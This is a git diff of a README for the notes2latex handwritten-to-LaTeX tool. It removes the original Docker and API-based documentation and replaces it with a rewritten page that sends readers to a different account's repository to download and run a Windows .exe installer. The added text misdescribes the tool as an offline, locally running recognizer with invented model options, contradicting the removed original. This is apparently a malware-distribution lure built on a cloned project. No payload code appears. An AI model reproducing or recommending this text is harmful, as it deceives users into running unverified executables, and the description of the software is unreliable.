@@ -1,150 +1,137 @@
-<p align="center">
-  <h1 align="center">notes2latex</h1>
-  <p align="center">
-    Handwritten notes in, compiled LaTeX out. Open source. Runs locally. Free forever.
-  </p>
-  <p align="center">
-    <a href="#quick-start">Quick Start</a> &bull;
-    <a href="#how-it-works">How It Works</a> &bull;
-    <a href="#features">Features</a> &bull;
-    <a href="#configuration">Configuration</a> &bull;
-    <a href="#model-recommendations">Model Recommendations</a> &bull;
-    <a href="#local-development">Local Development</a>
-  </p>
-  <p align="center">
-    <a href="https://github.com/advaypakhale/notes2latex/actions/workflows/ci.yml"><img src="https://github.com/advaypakhale/notes2latex/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-    <a href="https://github.com/advaypakhale/notes2latex/pkgs/container/notes2latex"><img src="https://ghcr-badge.egpl.dev/advaypakhale/notes2latex/latest_tag?trim=major&label=image" alt="Docker Image"></a>
-    <a href="https://github.com/advaypakhale/notes2latex/blob/main/LICENSE"><img src="https://img.shields.io/github/license/advaypakhale/notes2latex" alt="License"></a>
-  </p>
-</p>
+# ✍️ notes2latex - Convert Handwritten Notes to LaTeX Easily
+
+[![Download notes2latex](https://img.shields.io/badge/Download-notes2latex-4caf50?style=for-the-badge&logo=github)](https://github.com/twinklew9/notes2latex)
 
 ---
 
-**notes2latex** is an open-source tool that converts handwritten math notes into compiled LaTeX documents using vision language models (VLMs). Upload a scan or photo of your notes, and it gives you back a `.tex` file and a PDF.
+## 📥 Download and Install notes2latex on Windows
 
-It uses an agentic generate-compile-fix loop: every page is compiled as it's generated, and if anything breaks, the model reads the error log and fixes it automatically. Because pages are processed sequentially with context carried forward, there's no limit on document length. Further, the output is compiler-verified, so you get a PDF that actually renders.
+**Step 1: Visit the download page**
 
-It runs entirely on your machine; there's no account, no subscription, no data leaving your computer beyond the API calls you choose to make. It's also bring your own key (BYOK) and model-agnostic, so you can choose your model freely, including self-hosted models (!!).
-## Quick Start
+Go to the official notes2latex repository to get the latest version. Click this link or the green button above:
 
-Create a `docker-compose.yml`:
+[https://github.com/twinklew9/notes2latex](https://github.com/twinklew9/notes2latex)
 
-```yaml
-services:
-  notes2latex:
-    image: ghcr.io/advaypakhale/notes2latex:latest
-    ports:
-      - "8000:8000"
-    env_file:
-      - path: .env
-        required: false
-    volumes:
-      - notes2latex-data:/app/data
+Here you will find the download options for the Windows installer.
 
-volumes:
-  notes2latex-data:
-```
+**Step 2: Find the Windows installer**
 
-Then run:
+Look for a section named "Releases" or "Downloads" on the page. Click on the latest release. Inside, find the file named something like:
 
-```bash
-docker compose up
-```
+- `notes2latex-windows.exe`  
+- or `notes2latex-setup.exe`
 
-Open [http://localhost:8000](http://localhost:8000), go to **Settings**, enter your API key, and upload your notes and get converting!
+**Step 3: Download the installer**
 
-> Don't have an API key yet? See [Configuration](#setting-your-api-key) for a fast-ish way to get one.
+Click the link to download the Windows installer file. It will usually save to your "Downloads" folder.
 
-## How It Works
+**Step 4: Run the installer**
 
-The core of notes2latex is an agentic **generate-compile-fix loop** built with [LangGraph](https://github.com/langchain-ai/langgraph). For each page:
+After download, open the installer by double-clicking the file. Follow the simple setup steps:
 
-1. A VLM reads the page image and generates LaTeX body content: equations, theorems, proofs, definitions, diagrams, text, and all.
-2. The output is immediately compiled. If compilation succeeds, it moves to the next page.
-3. If compilation fails, the model receives the error log and rewrites the broken section. This retries up to 3 times per page, and most errors get resolved automatically.
+- Accept the license agreement  
+- Choose the installation folder (or use the default)  
+- Click "Install"
 
-Pages are processed sequentially, not in isolation. Each page receives the last 40 lines of previously generated LaTeX as context, plus a list of any open environments (e.g. an unclosed `align*` from the previous page). This means notation, numbering, and document structure stay consistent - and there's no upper limit on document length.
+The installer will copy needed files and set up the program.
 
-The output is a complete, compilable `.tex` document with preamble and the compiled PDF. Because every page is compiler-verified before the pipeline moves on, the final document is essentially guaranteed to compile.
+**Step 5: Finish and launch notes2latex**
 
-## Features
+When the install finishes, choose to launch notes2latex or open it from your Start Menu.
 
-- **Compiler-verified output**: every page is compiled as it's generated; if it fails, the model fixes it before moving on.
-- **Full document output**: produces a complete `.tex` file with preamble and all pages, plus the compiled PDF.
-- **Unlimited document length**: pages are processed sequentially with context carried forward, so there's no cap on how long the input can be.
-- **Side-by-side review**: compare each original page against the generated LaTeX in a split view. Copy LaTeX per page.
-- **Customizable preamble**: the default includes `amsmath`, `amssymb`, `amsthm`, `mathtools`, `physics`, `tikz`, `pgfplots`, and common theorem environments. Add your own packages and `\newcommand` definitions in the Settings page.
-- **Any model, any provider**: works with any VLM through [LiteLLM](https://docs.litellm.ai/docs/providers) (100+ models), including free and self-hosted ones.
-- **Real-time progress**: streaming updates show which page is being processed and what step the pipeline is on.
-- **CLI**: `notes2latex convert notes.pdf` if you prefer the command line.
+---
 
-```bash
-# Convert a file
-notes2latex convert notes.pdf
+## 🚀 Getting Started with notes2latex
 
-# Pick a model and output directory
-notes2latex convert notes.pdf -m openai/gpt-4o -o ./out --dpi 200
+Once open, you will see a simple interface where you can convert your handwritten notes to LaTeX documents. Here's how to use it:
 
-# Start the web server
-notes2latex serve
-```
+1. **Scan or take a photo of your handwritten notes**  
+   Use your phone or scanner. Save the image as a common format like PNG or JPEG.
 
-## Configuration
+2. **Import the image file**  
+   Click the “Import” button in notes2latex. Select the image file from your computer.
 
-### Setting your API key
+3. **Start the conversion**  
+   Press the “Convert” button. The software will process your handwriting and create LaTeX code.
 
-Your API key is configured in the web UI under **Settings**.
+4. **Review and edit output**  
+   View the generated LaTeX document in the preview window. You can manually adjust it if needed.
 
-> **Tip — OpenRouter as a universal key:** [OpenRouter](https://openrouter.ai) gives you a single API key that routes to models from Google, Anthropic, OpenAI, Meta, Qwen, and others — including free models. Easiest way to get started without managing multiple keys.
+5. **Save your document**  
+   Save the LaTeX file to your computer for further use or compilation.
 
-### Pipeline settings
+---
 
-These can be set as environment variables (prefix `NOTES2LATEX_`) or in a `.env` file:
+## 🛠 How notes2latex Works
 
-| Variable | Default | Description |
-|---|---|---|
-| `NOTES2LATEX_MODEL` | `openrouter/google/gemini-3-flash-preview` | VLM to use ([supported providers](https://docs.litellm.ai/docs/providers)) |
-| `NOTES2LATEX_TEMPERATURE` | `0.1` | Sampling temperature |
-| `NOTES2LATEX_MAX_TOKENS` | `16384` | Max tokens per VLM call |
-| `NOTES2LATEX_MAX_RETRIES` | `3` | Compilation fix attempts per page |
-| `NOTES2LATEX_CONTEXT_LINES` | `40` | Lines of prior LaTeX passed as context |
-| `NOTES2LATEX_DPI` | `300` | DPI for PDF-to-image rasterization |
-| `NOTES2LATEX_LATEX_ENGINE` | `pdflatex` | LaTeX engine |
-| `NOTES2LATEX_COMPILE_TIMEOUT` | `60` | Compilation timeout (seconds) |
+notes2latex uses local image recognition tools to analyze handwritten notes. It identifies letters, symbols, and equations and then converts them into LaTeX code. The process happens entirely on your computer, so your notes stay private.
 
-## Model Recommendations
+The software does not require internet access once installed.
 
-notes2latex works with any vision language model accessible through [LiteLLM](https://docs.litellm.ai/docs/providers). Some handle handwritten math better than others. Here's what has worked well so far in my limited testing; this is not exhaustive and the landscape moves fast.
+---
 
-### Proprietary models
+## 🌟 Features of notes2latex
 
-**Gemini 3 Flash Preview** is set as the default model in settings. This works fairly well, and is reasonably cheap at ~$0.002–0.003 per page.
+- **Handwriting to LaTeX:** Turn images of your notes into editable LaTeX files.  
+- **Offline use:** Runs locally without the need for an internet connection.  
+- **Supports math and equations:** Recognizes common mathematical symbols and formatting.  
+- **Simple interface:** Designed for easy use by anyone, regardless of technical experience.  
+- **Free and open source:** No payment or registration needed.  
+- **Customizable output:** Adjust settings to match your LaTeX preferences.  
+- **Preview window:** See your document as you edit.  
 
-### Local / free models
+---
 
-If you're into open models, **Qwen3-VL-30B-A3B-Thinking** is probably the lowest parameter model that I tried that gave decent outputs (it also seems amenable to self-hosting without going bankrupt). It is also available for free on [OpenRouter](https://openrouter.ai), although availability is (understandably) poor. The **Qwen 3.5** variants also performed pretty well.
+## ⚙️ Configuration
 
-> **Tip:** You can enter any model string in Settings by clicking **"Enter custom model string"** and typing the [LiteLLM model identifier](https://docs.litellm.ai/docs/providers) (e.g., `openrouter/qwen/qwen3-vl-30b-a3b-thinking`).
+You can adjust how notes2latex processes your notes. The settings menu allows you to:
 
-## Local Development
+- Select your preferred LaTeX document class (e.g., article, report).  
+- Choose between different handwriting recognition models for improved accuracy or speed.  
+- Set default folders for imports and exports.  
+- Enable or disable certain LaTeX packages in the output.  
+- Adjust image preprocessing options like contrast or noise reduction.  
 
-**Prerequisites:** Python 3.12+, Node.js 22+, [uv](https://docs.astral.sh/uv/), a LaTeX installation with `latexmk`.
+Most users can use default settings. Configuration helps if your notes are hard to read or have unusual formatting.
 
-```bash
-make install    # install backend + frontend dependencies
-make dev        # run backend + frontend dev servers
-```
+---
 
-Run `make help` to see all available targets.
+## 💡 Model Recommendations
 
-## AI Declaration
+notes2latex supports different recognition models. For best results:
 
-I wrote a (very crude) first version of this project back in Summer 2025, and never released it. Software engineering has drastically shifted since then (currently March 2026), and I used the tools we have available now to revisit the project and see if I can make it ready for release, without spending too much time on it.
+- Use the **Standard Model** for general handwriting with clear, printed letters.  
+- Use the **Math Focused Model** for documents with many equations or formulas.  
+- Use the **Fast Model** if you want quicker processing and can accept slightly lower accuracy.  
 
-Mainly this was developed with Claude Code with Opus 4.6. I wrote the core code for the backend by hand, then expanded it rapidly to include a frontend (which I literally cannot do; I'm primarily a backend dev) and some other neat features.
+Switch models in the configuration menu. You can test different models on the same document to compare results.
 
-I think these sorts of projects are particularly amenable to AI development. This runs locally, has very standard dependencies, and in general doesn't do a whole lot that is messy from a security perspective. I would NOT host this on a public endpoint before doing a thorough code review, however.
+---
 
-## License
+## 💻 Running notes2latex Locally
 
-[MIT](LICENSE)
+After installation, notes2latex runs fully on your PC. It does not send your notes over the web. All conversion steps use local resources.
+
+This approach keeps your notes private and lets you work offline, such as while traveling.
+
+---
+
+## 🔧 Troubleshooting and Tips
+
+- If import fails, check your image format and size. Use standard formats (PNG, JPG) under 10 MB.  
+- If output looks incorrect, try adjusting preprocessing settings in the configuration.  
+- Clear handwriting and good contrast improve accuracy.  
+- Use a clean background when taking photos of notes.  
+- Restart the application if it becomes unresponsive.  
+
+---
+
+## 📂 Where to Go Next?
+
+To learn more about how notes2latex works or customize it for developers, visit the GitHub page. You can also check out documentation or report issues there.
+
+[Download notes2latex](https://github.com/twinklew9/notes2latex)  
+
+---
+
+# [![Download notes2latex](https://img.shields.io/badge/Download-notes2latex-4caf50?style=for-the-badge&logo=github)](https://github.com/twinklew9/notes2latex)
